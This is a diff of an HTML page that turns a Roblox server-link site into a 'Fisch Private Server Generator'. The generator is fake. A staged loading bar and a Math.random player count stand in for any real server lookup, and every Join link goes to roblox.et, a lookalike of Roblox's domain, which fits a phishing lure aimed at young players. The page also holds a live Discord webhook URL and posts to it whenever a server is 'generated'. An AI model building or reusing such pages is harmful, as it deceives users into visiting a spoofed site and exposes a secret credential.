@@ -3,286 +3,199 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VOID SERVERS</title>
+    <title>Fisch Private Server Generator</title>
     <style>
-        /* Import Poppins font from Google Fonts */
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
 
-        /* Basic body styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Orbitron', sans-serif;
+        }
+
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(to right, #0d001a, #23004d); /* Gradient background */
-            color: white; /* White text */
-            text-align: center; /* Center align text */
-            padding: 20px;
-            overflow-x: hidden; /* Hide horizontal scrollbar */
-        }
-
-        /* Header styles */
-        header {
-            padding: 15px 30px;
-            background: rgba(255, 255, 255, 0.1); /* Semi-transparent background */
-            border-radius: 15px;
-            box-shadow: 0 0 20px #6a0dad; /* Shadow effect */
-            animation: glow 2s infinite alternate; /* Glowing animation */
-        }
-
-        /* Button styles */
-        .button {
-            background: linear-gradient(to right, #6a0dad, #9400D3); /* Gradient background */
-            color: white;
-            font-weight: bold;
-            padding: 12px 20px;
-            border: none; /* Remove default border */
-            border-radius: 10px;
-            cursor: pointer; /* Change cursor to pointer on hover */
-            transition: all 0.3s ease-in-out; /* Smooth transition for hover effects */
-            margin: 10px;
-        }
-
-        /* Button hover effect */
-        .button:hover {
-            background: linear-gradient(to right, #9400D3, #6a0dad); /* Reverse gradient on hover */
-            box-shadow: 0 0 15px #6a0dad; /* Increased shadow on hover */
-        }
-
-        /* Giveaway Popup styles */
-        .popup {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%); /* Center the popup */
-            background: rgba(0, 0, 0, 0.9); /* Semi-transparent background */
-            padding: 20px;
-            width: 300px;
-            border-radius: 15px;
-            box-shadow: 0 0 15px #FFD700;
+            background: #000;
+            color: #0ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             text-align: center;
-            display: block; /* Show popup on page load */
-            animation: fadeIn 0.5s ease-out; /* Fade-in animation */
+            overflow: hidden;
         }
 
-        /* Fade-in animation for the popup */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translate(-50%, -60%); }
-            to { opacity: 1; transform: translate(-50%, -50%); }
+        .container {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px #0ff;
+            animation: fadeIn 1s ease-in-out;
+            width: 300px;
         }
 
-        /* Popup heading styles */
-        .popup h2 {
-            color: #FFD700; /* Yellow color */
-        }
-
-        /* Close button styles */
-        .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            background: #FFD700;
-            color: #000;
-            border: none;
-            padding: 5px 10px;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 5px;
-            transition: 0.3s;
-        }
-
-        /* Close button hover effect */
-        .close-btn:hover {
-            background: #FF8C00; /* Orange color on hover */
-        }
-
-        /* Small text styles */
-        .small-text {
-            font-size: 12px;
-            color: #FFD700; /* Yellow color */
-            margin-top: 5px;
-        }
-
-        /* Feedback Form styles */
-        .feedback-form {
-            background: rgba(255, 255, 255, 0.1); /* Semi-transparent background */
-            padding: 20px;
-            width: 60%;
-            margin: auto;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2); /* Shadow effect */
-            margin-top: 20px;
-        }
-
-        /* Input and textarea styles */
-        input, textarea {
-            width: 90%;
-            padding: 10px;
-            margin: 10px;
-            border: none; /* Remove default border */
-            border-radius: 5px;
-            background: rgba(255, 255, 255, 0.1); /* Semi-transparent background */
-            color: white;
-            font-size: 1em;
-        }
-
-        /* Textarea height */
-        textarea {
-            height: 100px;
-        }
-
-        /* Rating stars styles */
-        .rating {
-            display: inline-block;
-            position: relative;
-            font-size: 20px;
-            color: #FFD700;
-        }
-
-        .rating input {
-            display: none;
-        }
-
-        .rating label {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 20px;
-            height: 20px;
-            background: url('https://www.example.com/star-empty.png') no-repeat; /* Replace with your actual star-empty.png URL */
-            background-size: contain;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .rating label:hover,
-        .rating label:hover ~ label,
-        .rating input:checked ~ label {
-            background: url('https://www.example.com/star-filled.png') no-repeat; /* Replace with your actual star-filled.png URL */
-            background-size: contain;
-        }
-
-        .rating input:checked ~ label ~ label {
-            background: url('https://www.example.com/star-filled.png') no-repeat; /* Replace with your actual star-filled.png URL */
-            background-size: contain;
-        }
-
-        /* Styles for user count display */
-        .user-count {
+        h1 {
             font-size: 24px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 5px #0ff, 0 0 10px #00f;
+        }
+
+        #playerCount {
+            font-size: 20px;
+            margin-bottom: 15px;
+            animation: glow 1.5s infinite alternate;
+        }
+
+        button {
+            background: black;
+            color: cyan;
+            border: 2px solid cyan;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 10px cyan;
+        }
+
+        button:hover {
+            background: cyan;
+            color: black;
+            box-shadow: 0 0 20px cyan;
+        }
+
+        .join {
             margin-top: 10px;
+            display: none; /* Hidden initially */
+        }
+
+        /* Loading Bar */
+        .loading-container {
+            display: none;
+            width: 100%;
+            background: #111;
+            border-radius: 5px;
+            margin-top: 10px;
+            height: 10px;
+            overflow: hidden;
+        }
+
+        .loading-bar {
+            width: 0%;
+            height: 100%;
+            background: cyan;
+            transition: width 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 5px cyan; }
+            to { text-shadow: 0 0 15px cyan; }
+        }
+
+        @keyframes dots {
+            0% { content: "."; }
+            33% { content: ".."; }
+            66% { content: "..."; }
+            100% { content: ""; }
+        }
+
+        .loading-text::after {
+            content: ".";
+            animation: dots 1.5s infinite steps(1);
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <h1 style="color: #9400D3; animation: glow 2s infinite alternate;">VOID SERVERS</h1>
-    </header>
-
-    <!-- Giveaway Winners Popup (Auto Opens) -->
-    <div class="popup" id="giveaway-popup">
-        <button class="close-btn" onclick="closePopup()">X</button>
-        <h2>🏆 Giveaway Winners</h2>
-        <p>🥇 Mainarxd123</p>
-        <p>🥈 Supersecretspy5</p>
-        <p>🥉 Kajawh1</p>
-        <p class="small-text">Updates Everytime I upload a video</p>
+    <div class="container">
+        <h1>Fisch Private Server Generator</h1>
+        <p id="playerCount">Players: --/15</p>
+        <button id="generateBtn">Generate</button>
+        <div class="loading-container">
+            <div class="loading-bar"></div>
+        </div>
+        <a id="joinBtn" href="https://www.roblox.et/games/16732694052/Fisch-MOBY?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+            <button class="join">Join</button>
+        </a>
     </div>
 
-    <!-- Main Content -->
-    <main>
-        <h2>🌌 BloxFruit Servers</h2>
-        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756', '_blank')">Join Server</button>
-        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756', '_blank')">Join Server</button>
-
-        <h2>💸 Trading Servers</h2>
-        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756', '_blank')">Join Trading</button>
-
-        <h2>🔥 Event Servers</h2>
-        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756', '_blank')">Mirage Hunting (V4)</button>
-        <button class="button" onclick="window.open('https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756', '_blank')">Leviathan Hunting</button>
-
-        <div class="user-count">1K+ Users</div>
-
-        <!-- Feedback Form -->
-        <section class="feedback-form" id="feedback">
-            <h2>📝 Submit Feedback</h2>
-            <form id="feedback-form">
-                <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
-                <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
-                <div class="rating">
-                    <input type="radio" id="star5" name="rating" value="5" />
-                    <label for="star5"></label>
-                    <input type="radio" id="star4" name="rating" value="4" />
-                    <label for="star4"></label>
-                    <input type="radio" id="star3" name="rating" value="3" />
-                    <label for="star3"></label>
-                    <input type="radio" id="star2" name="rating" value="2" />
-                    <label for="star2"></label>
-                    <input type="radio" id="star1" name="rating" value="1" />
-                    <label for="star1"></label>
-                </div>
-                <button type="submit" class="button">Submit Feedback</button>
-            </form>
-        </section>
-    </main>
-
     <script>
-        // Function to close the Giveaway Winners Popup
-        function closePopup() {
-            document.getElementById('giveaway-popup').style.display = 'none';
-        }
+        document.getElementById("generateBtn").addEventListener("click", function() {
+            let generateBtn = document.getElementById("generateBtn");
+            let playerCount = document.getElementById("playerCount");
+            let loadingBar = document.querySelector(".loading-bar");
+            let loadingContainer = document.querySelector(".loading-container");
+            let joinBtn = document.querySelector(".join");
 
-        // Event listener for Feedback Form submission
-        document.getElementById('feedback-form').addEventListener('submit', (e) => {
-            e.preventDefault(); // Prevent default form submission behavior
+            if (generateBtn.disabled) return; // Prevent multiple clicks
 
-            // Get username and message from the form
-            const username = document.getElementById('feedback-user').value.trim();
-            const message = document.getElementById('feedback-message').value.trim();
+            generateBtn.disabled = true;
+            generateBtn.innerText = "Generating";
+            generateBtn.classList.add("loading-text");
+            playerCount.innerText = "Generating...";
 
-            // Get the selected rating
-            const rating = document.querySelector('input[name="rating"]:checked')?.value;
+            loadingContainer.style.display = "block";
+            loadingBar.style.width = "0%";
 
-            // Check if all fields are filled
-            if (username && message && rating) {
-                // Discord Webhook URL (Replace with your actual URL)
-                const webhookURL = "https://discord.com/api/webhooks/1342415288687263765/fETgTKU3aTVtmRzJUuK9fBwJee3yuINkg6FicBid-Oy_zQMdUZl_7Vx602HlEgopVxET"; 
+            let waitTime = 10; // Fixed 10-second wait time
+            let interval = waitTime * 10; // Smooth progress bar
 
-                // Construct the payload for the Discord webhook
-                const payload = {
-                    embeds: [{
-                        title: "📝 New Feedback Received!", // Title of the embed
-                        color: 0xFFD700, // Yellow color for the embed
-                        fields: [ // Fields for username, message, and rating
-                            { name: "👤 Roblox Username", value: username, inline: true },
-                            { name: "💬 Feedback", value: message },
-                            { name: "⭐ Rating", value: rating, inline: true }
-                        ],
-                        footer: { text: "VOID SERVERS Feedback" }, // Footer text
-                        timestamp: new Date().toISOString() // Current timestamp
-                    }]
-                };
+            let progress = 0;
+            let progressInterval = setInterval(() => {
+                progress += 100 / interval;
+                loadingBar.style.width = `${progress}%`;
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                }
+            }, 100);
 
-                // Send the feedback to the Discord webhook
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                })
-                .then(response => {
-                    if (response.ok) {
-                        alert("✅ Feedback submitted successfully! Thank you.");
-                        document.getElementById('feedback-form').reset(); // Reset the form
-                    } else {
-                        alert("❌ Failed to submit feedback.");
-                    }
-                })
-                .catch(() => {
-                    alert("❌ Error sending feedback.");
-                });
-            } else {
-                alert("⚠️ Please fill out all fields.");
-            }
+            setTimeout(() => {
+                let randomPlayers = Math.floor(Math.random() * 16); 
+                playerCount.innerText = `Players: ${randomPlayers}/15`;
+
+                generateBtn.innerText = "Generate";
+                generateBtn.classList.remove("loading-text");
+                generateBtn.disabled = false;
+
+                loadingContainer.style.display = "none";
+                joinBtn.style.display = "block"; // Show join button after loading
+
+                // Send webhook message
+                sendWebhook(randomPlayers);
+            }, waitTime * 1000);
         });
+
+        function sendWebhook(playerCount) {
+            let webhookUrl = "https://discord.com/api/webhooks/1342415288687263765/fETgTKU3aTVtmRzJUuK9fBwJee3yuINkg6FicBid-Oy_zQMdUZl_7Vx602HlEgopVxET";
+            
+            let embed = {
+                "embeds": [{
+                    "title": "🔹 Private Server Generated 🔹",
+                    "description": `A private server was generated with **${playerCount}/15** players.`,
+                    "color": 3447003, // Cyan color
+                    "fields": [
+                        {
+                            "name": "🔗 Server Link",
+                            "value": "[Click to Join](https://www.roblox.et/games/16732694052/Fisch-MOBY?privateServerLinkCode=59816836148209918793607839663756)"
+                        }
+                    ],
+                    "footer": {
+                        "text": "Fisch Private Server Generator"
+                    }
+                }]
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(embed)
+            });
+        }
     </script>
 </body>
 </html>
